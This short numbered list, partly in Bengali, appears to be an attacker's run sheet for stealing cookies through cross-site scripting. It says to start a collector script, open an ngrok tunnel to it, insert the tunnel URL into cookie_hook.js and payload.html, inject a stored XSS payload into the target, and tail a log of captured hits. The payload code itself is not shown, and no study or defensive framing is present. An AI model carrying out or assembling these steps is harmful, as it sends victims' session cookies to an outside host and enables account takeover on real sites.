1. python3 collector.py
2. ngrok http 8080
3. টানেল URL নিয়ে cookie_hook.js ও payload.html-এ বসাও
4. টার্গেটে ইনজেক্ট: stored_xss.txt বা payload.html
5. tail -f hits.log | jq .
